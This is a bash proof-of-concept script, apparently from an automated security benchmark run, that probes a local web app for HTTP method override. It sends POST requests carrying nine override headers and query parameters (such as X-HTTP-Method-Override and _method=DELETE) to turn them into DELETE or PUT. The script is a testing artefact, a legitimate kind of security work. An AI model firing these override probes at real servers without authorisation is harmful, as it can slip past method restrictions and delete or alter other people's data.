#!/bin/bash
# POC: Demonstrates excessive HTTP method override support through 9 different vectors (5 headers + 4 query parameters)
# Target: ./repo
# Created: 2025-11-07T22:00:11.365Z
# Session: benchmark-XBEN-077-24-mhpdz86a

# Excessive HTTP Method Override Support - Multiple Vectors POC
# Tests support for 9 different method override mechanisms

TARGET="${1:-http://localhost:3000}"
ENDPOINT="${TARGET}/"

echo "[*] Testing Excessive HTTP Method Override Support"
echo "[*] Target: ${TARGET}"
echo "[*] Endpoint: ${ENDPOINT}"
echo ""

# Test that direct DELETE is blocked
echo "=== Baseline: Direct DELETE Request (should be blocked) ==="
curl -s -X DELETE "${ENDPOINT}" -w "\nStatus: %{http_code}\n" | head -20
echo ""

# Test 5 HTTP Header Override Vectors
echo "=== Testing HTTP Header Override Vectors ==="
echo ""

echo "[1] Testing X-HTTP-Method-Override: DELETE"
curl -s -X POST -H "X-HTTP-Method-Override: DELETE" "${ENDPOINT}" -w "\nStatus: %{http_code}\n" | head -20
echo ""

echo "[2] Testing X-Method-Override: PUT"
curl -s -X POST -H "X-Method-Override: PUT" "${ENDPOINT}" -w "\nStatus: %{http_code}\n" | head -20
echo ""

echo "[3] Testing X-Original-Method: DELETE"
curl -s -X POST -H "X-Original-Method: DELETE" "${ENDPOINT}" -w "\nStatus: %{http_code}\n" | head -20
echo ""

echo "[4] Testing X-Method: PUT"
curl -s -X POST -H "X-Method: PUT" "${ENDPOINT}" -w "\nStatus: %{http_code}\n" | head -20
echo ""

echo "[5] Testing X-Requested-With: DELETE"
curl -s -X POST -H "X-Requested-With: DELETE" "${ENDPOINT}" -w "\nStatus: %{http_code}\n" | head -20
echo ""

# Test 4 Query Parameter Override Vectors
echo "=== Testing Query Parameter Override Vectors ==="
echo ""

echo "[6] Testing _method=DELETE query parameter"
curl -s -X POST "${ENDPOINT}?_method=DELETE" -w "\nStatus: %{http_code}\n" | head -20
echo ""

echo "[7] Testing _m=PUT query parameter"
curl -s -X POST "${ENDPOINT}?_m=PUT" -w "\nStatus: %{http_code}\n" | head -20
echo ""

echo "[8] Testing method=DELETE query parameter"
curl -s -X POST "${ENDPOINT}?method=DELETE" -w "\nStatus: %{http_code}\n" | head -20
echo ""

echo "[9] Testing http_method=PUT query parameter"
curl -s -X POST "${ENDPOINT}?http_method=PUT" -w "\nStatus: %{http_code}\n" | head -20
echo ""

echo "[*] POC Complete - All 9 method override vectors tested"